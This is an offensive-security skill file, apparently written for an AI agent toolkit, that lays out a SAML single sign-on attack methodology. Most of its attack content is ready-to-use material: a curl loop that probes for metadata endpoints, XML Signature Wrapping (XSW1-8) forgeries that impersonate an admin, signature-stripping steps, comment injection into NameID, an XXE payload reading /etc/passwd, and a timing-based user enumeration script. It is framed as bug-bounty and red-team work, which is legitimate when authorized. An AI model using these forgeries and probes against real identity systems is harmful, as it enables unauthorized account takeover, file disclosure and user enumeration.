---
name: SAML SSO Attack
description: Attack SAML SSO — XML Signature Wrapping (XSW1-8), signature stripping, comment/parser-differential injection in NameID, XXE, key confusion, replay, and SSO user enumeration for account takeover.
tags: [saml, sso, auth-bypass, xml-signature, xsw, identity]
recommended_tools: [http_request, http_repeater, http_intruder, curl, python3, subfinder_scan, httpx_probe, nuclei_scan]
vuln_classes: [auth_bypass]
domain: web
phase: exploitation
provenance: {source: uphiago/recon-skills, paths: [auth/saml-sso-attack/SKILL.md, redteam/hunt-saml/SKILL.md]}
---

# SAML SSO Attack

SAML Single Sign-On attack methodology: IdP/SP discovery, metadata analysis, XML Signature Wrapping (XSW1-XSW8), signature stripping, comment/parser-differential injection in `NameID`, XXE in assertions, multi-signature/key confusion, audience-restriction and `InResponseTo` replay flaws, and SSO timing-based user enumeration. SAML bugs routinely pay High-Critical because XML parsers are inconsistent and canonicalization mismatches are common.

## When to Use

- Target uses SSO: redirects to `idp.`, `sso.`, `login.`, `auth.` subdomains.
- URL/POST body contains a `SAMLRequest=` or `SAMLResponse=` parameter.
- A metadata endpoint is reachable: `/saml2/idp/metadata.php`, `/FederationMetadata/2007-06/FederationMetadata.xml`, `/Shibboleth.sso/Metadata`.
- An AssertionConsumerService (`/saml/acs`, `/sso/saml/callback`) is reachable.
- After discovering ADFS (e.g. via an Exchange/OWA path).

## Gate 0 — What counts as proof

A finding is Critical/High ONLY when a forged or altered message crosses an authorization boundary:

- **XSW / signature strip / key confusion**: forged `SAMLResponse` is accepted by the SP AND yields a session for a *different* identity (`NameID`) or elevated role. Merely mutating a display name or locale is Informational.
- **Comment/parser-differential injection**: the effective logged-in identity differs from the cryptographically signed identity.
- **Replay**: the same `SAMLResponse` is accepted twice inside the validity window (no `InResponseTo`/one-time-use tracking).
- **XXE**: file/SSRF content actually surfaces in a response, error, or audit log.

If XML was altered but no authorization decision changed, it is not a vulnerability.

## Attack surface & discovery

Common SAML paths and the stack they reveal:

| Path | Stack |
|------|-------|
| `/saml2/idp/metadata.php` | SimpleSAMLphp IdP |
| `/saml2/sp/metadata.php` | SimpleSAMLphp SP |
| `/simplesaml/` | SimpleSAMLphp root |
| `/FederationMetadata/2007-06/FederationMetadata.xml` | ADFS |
| `/adfs/ls/IdpInitiatedSignOn.aspx` | ADFS login |
| `/adfs/services/trust` | ADFS WS-Trust |
| `/auth/realms/master/protocol/saml` | Keycloak SAML |
| `/idp/shibboleth`, `/Shibboleth.sso/Metadata` | Shibboleth |
| `/sso/saml`, `/saml/acs`, `/sso/saml/callback` | Generic SAML SP/ACS |
| `/.well-known/openid-configuration` | OIDC (adjacent) |

```bash
TARGET="$1"
for path in \
  /saml2/idp/metadata.php /saml2/sp/metadata.php /simplesaml/ \
  /FederationMetadata/2007-06/FederationMetadata.xml \
  /adfs/ls/IdpInitiatedSignOn.aspx /adfs/services/trust \
  /auth/realms/master/protocol/saml /idp/shibboleth \
  /Shibboleth.sso/Metadata /sso/saml /saml/acs /sso/saml/callback; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$TARGET$path")
  [[ "$code" == 200 || "$code" == 302 ]] && echo "[FOUND] $path (HTTP $code)"
done

# Grep discovered URLs for SSO surface
grep -iE "saml|sso|login.*redirect|oauth|idp|/sp/|Shibboleth" urls.txt
```

## Extract & analyze IdP metadata

Metadata reveals entity ID, signing certs, endpoints, bindings, and NameID formats — the prerequisites for every attack below.

```bash
curl -sk --max-time 10 "$METADATA_URL" | python3 -c "
import sys
from xml.etree import ElementTree as ET
root = ET.fromstring(sys.stdin.read())
print('Entity ID:', root.get('entityID', 'unknown'))
for c in root.iter('{http://www.w3.org/2000/09/xmldsig#}X509Certificate'):
    t = c.text.strip(); print(f'Signing Cert ({len(t)}): {t[:60]}...')
for el in root.iter():
    if 'Binding' in el.attrib and ('HTTP-Redirect' in el.attrib['Binding'] or 'HTTP-POST' in el.attrib['Binding']):
        print('Endpoint:', el.attrib.get('Location',''), '[', el.attrib['Binding'].split(':')[-1], ']')
for el in root.iter('{urn:oasis:names:tc:SAML:2.0:metadata}NameIDFormat'):
    print('NameID Format:', el.text)
"
```

## Decode SAMLRequest / SAMLResponse

Redirect binding = base64 + raw DEFLATE (`zlib.decompress(raw, -15)`). POST binding = raw base64, NO compression.

```bash
echo "$SAML_B64" | python3 -c "
import sys, base64, zlib
from xml.etree import ElementTree as ET
raw = base64.b64decode(sys.stdin.read().strip())
try: xml = zlib.decompress(raw, -15).decode()   # Redirect binding
except Exception: xml = raw.decode('utf-8','replace')  # POST binding
print(xml[:3000])
root = ET.fromstring(xml)
print('\n=== Analysis ===')
print('ID:', root.get('ID'))
print('ForceAuthn:', root.get('ForceAuthn','false'))
iss = root.find('.//{urn:oasis:names:tc:SAML:2.0:assertion}Issuer')
if iss is not None: print('Issuer:', iss.text)
pol = root.find('.//{urn:oasis:names:tc:SAML:2.0:protocol}NameIDPolicy')
if pol is not None: print('NameIDPolicy AllowCreate=%s Format=%s' % (pol.get('AllowCreate','false'), pol.get('Format','unspecified')))
"
```

Key triage question when you hold a signed `SAMLResponse`: **is the `<ds:Signature>` on the `Response` level or only the `Assertion` level?** Assertion-only signing is the precondition for classic XSW.

## Attack 1 — XML Signature Wrapping (XSW1)

Relocate the validly-signed assertion, inject an evil assertion the app processes instead. Signature still validates (it covers `#legit`); app reads the FIRST/other assertion (evil).

```xml
<!-- Signature covers ID=legit and still validates.
     Vulnerable SP processes ID=evil (first/topmost) = admin. -->
<saml:Response>
  <saml:Assertion ID="evil">
    <NameID>admin@company.com</NameID>
  </saml:Assertion>
  <saml:Assertion ID="legit">
    <NameID>user@company.com</NameID>
    <ds:Signature><!-- Valid, references #legit --></ds:Signature>
  </saml:Assertion>
</saml:Response>
```

Manual workflow: capture `SAMLResponse` (Burp/DevTools) → decode → determine signature level → build wrapped response → POST to the SP ACS → session as admin = XSW confirmed. `SAMLRaider` (Burp BApp) automates XSW mutation.

## Attack 2 — XSW2-XSW8 (modern library bypasses)

Modern libraries added position/ID-based signature binding; these variants defeat those checks.

| Variant | Technique | Bypasses |
|---------|-----------|----------|
| XSW2 | Move `<ds:Signature>` INSIDE a child of the evil assertion | Verify signature position relative to root |
| XSW3 | Split assertion across XML-comment boundaries in the reference URI | URI-fragment matching |
| XSW4 | Inject a second `AuthnStatement`/`AttributeStatement` inside the signed assertion | Process all statements, not just first |
| XSW5 | Give the INJECTED assertion an `ID` matching the signed reference's `URI` | Match by ID string, not DOM position |
| XSW6 | Namespace-prefix alias — injected assertion uses a different prefix, same namespace | Key on prefix string |
| XSW7 | XXE inside the signature-reference URI to poison the digest check | Resolve entities during validation |
| XSW8 | XSLT injection in `<ds:Transform>` to rewrite the post-signature DOM | Apply transforms after verification |

```xml
<!-- XSW4: extra role-bearing statement inside the legit signed assertion -->
<saml:Response>
  <saml:Assertion ID="legit">
    <ds:Signature><!-- Valid --></ds:Signature>
    <saml:AttributeStatement>
      <saml:Attribute Name="Role"><saml:AttributeValue>Administrator</saml:AttributeValue></saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</saml:Response>
```

Probe XSW2 through XSW8 systematically; different libraries fall to different variants, so try each rather than stopping at the first rejection.

## Attack 3 — Signature stripping

If the SP does not enforce signature *presence* (`wantAssertionsSigned=false`), delete the signature and forge identity.

```bash
echo "$B64" | base64 -d | xmllint --format - > saml.xml
# 1. Delete the entire <ds:Signature> element
# 2. Change <NameID> to admin@company.com
# 3. Re-encode. POST binding: base64 -w0 saml.xml (no compression)
#    Redirect binding: raw DEFLATE then base64, then URL-encode
base64 -w0 saml.xml
# Submit as SAMLResponse to /saml/acs. Accepted -> admin ATO.
```

## Attack 4 — Comment / parser-differential injection in NameID

The signer's canonicalization (C14N *without* comments) and the app's text-node extraction disagree about comment boundaries, producing two different effective identities from one signed value. `CVE-2017-11428` (Ruby-SAML / OneLogin), `CVE-2016-5697`.

```xml
<!-- Signed canonical value: admin@company.com.evil.com (attacker controls this account).
     App reads only up to the comment boundary: admin@company.com (victim identity). -->
<NameID>admin@company.com<!---->.evil.com</NameID>
```

Parser differentials go beyond comments — parsers (libxml2, Xerces, MSXML, .NET System.Xml) also disagree on:

- **Whitespace normalization** — leading/trailing spaces in `NameID`, tab-vs-space between attributes.
- **CDATA handling** — `<NameID><![CDATA[admin@company.com]]></NameID>` vs plain text; some strip CDATA, some keep it.
- **Namespace prefix expansion** — declared alias vs inherited default namespace.
- **Entity expansion order** — post-parse DOM differs from the pre-sign canonical form.

Detection: re-encode the same assertion with each formatting variation (whitespace, CDATA, namespace redeclaration); if any variation yields a logged-in identity different from the signed one, you have a parser differential.

## Attack 5 — XXE in the assertion

SAML assertions are XML; a parser lacking `disallow-doctype-decl` is a file-read/SSRF primitive.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<saml:Assertion>
  <NameID>&xxe;</NameID>
</saml:Assertion>
```

If the SP renders or logs `NameID`, `/etc/passwd` (or an SSRF target's response) surfaces in the response, error, or audit log.

## Attack 6 — Multi-signature / signature copy

Some SPs verify that *a* signature exists, not *what it covers*. Copy a valid `<ds:Signature>` from any previously-seen assertion (public SAML demo IdP, a prior login) and staple it to an evil assertion.

```xml
<saml:Response>
  <saml:Assertion ID="evil">
    <NameID>admin@company.com</NameID>
    <AttributeStatement>
      <Attribute Name="Role"><AttributeValue>Administrator</AttributeValue></Attribute>
    </AttributeStatement>
  </saml:Assertion>
  <ds:Signature><!-- Copied; SP checks existence, not coverage --></ds:Signature>
</saml:Response>
```

## Attack 7 — Key confusion (federated trust abuse)

When the SP trusts multiple IdPs and skips `<Issuer>` / `<AudienceRestriction>` validation, an assertion signed by an attacker-controlled IdP is accepted as if from the victim IdP.

```
1. Register as / stand up an IdP on a federated platform.
2. Sign an assertion for admin@company.com with YOUR IdP private key.
3. POST to the victim SP AssertionConsumerService.
4. SP accepts without checking Issuer == expected IdP  ->  cross-tenant admin ATO.
```

## Attack 8 — Replay & NameID manipulation

- **Replay**: send the same `SAMLResponse` twice. If both create sessions, the SP lacks `InResponseTo`/one-time-use tracking → session hijacking.
- **NameID fuzzing**: `admin@company.com`, `administrator@company.com`, `support@target.com`, any email in disclosed reports for the program, and `${7*7}` (SSTI if the NameID is rendered into a template).

## Attack 9 — SSO timing user enumeration

Valid users trigger an LDAP/AD lookup before the SAML response is returned, creating a measurable time delta. A consistent gap >200ms is significant.

```bash
while read -r user; do
  start=$(date +%s%N)
  curl -sk -o /dev/null --max-time 15 \
    "https://$TARGET/sso/login?username=$user&password=WRONG_PASS"
  end=$(date +%s%N)
  echo "$user: $(( (end - start) / 1000000 ))ms"
done < users.txt | sort -t: -k2 -rn | head -20
```

## SSO-bypass side channels

SSO usually gates the human UI but not machine endpoints. On SSO-fronted WordPress, `/wp-admin/` redirects to the IdP but `/wp-json/` and `/xmlrpc.php` are frequently NOT behind SSO — enumerate users and abuse XMLRPC methods without ever authenticating. ADFS `/adfs/services/trust` `UsernameMixed` allows raw credential testing outside the SSO UI.

## Triage / severity

| Result | Severity |
|--------|----------|
| XSW (any variant) accepted → ATO | Critical |
| Signature stripping → ATO | Critical |
| Key confusion → cross-tenant ATO | Critical |
| Comment / parser-differential → admin ATO | High |
| XXE in assertion → file read / SSRF | High |
| Replay accepted twice | High |
| NameID manipulation (depends on mapping) | Medium/High |
| XML altered, no authorization change | Informational |

## Chaining

- **OAuth front-ends**: SP that mints OAuth bearer tokens after SAML validation → XSW-altered `NameID=admin` yields an admin-claim OAuth token, escalating one forged assertion into token-level ATO across every OAuth-scoped API.
- **Audience-restriction gap**: XSW1 + missing `<AudienceRestriction>` validation is the canonical cross-federation admin-SP-impersonation chain.
- **XXE → SSRF/file read** stacks on top of any assertion-parsing attack.

## Pitfalls

- XSW requires understanding XML namespaces and canonicalization — mutate structure precisely.
- Responses are large; POST binding (not URL) is normal for `SAMLResponse`.
- Signature stripping only works on broken SPs; modern SPs reject unsigned assertions.
- If the SP validates `InResponseTo`, replay fails — confirm before claiming it.

## References

- CWE-347 Improper Verification of Cryptographic Signature; CWE-287 Improper Authentication; CWE-611 XXE.
- CVE-2017-11428 (Ruby-SAML / OneLogin comment truncation), CVE-2016-5697 (SAML comment injection).
- PortSwigger research "The Fragile Lock" (A. Fedotkin) — parser differentials, multi-signature confusion, XSW2-8.
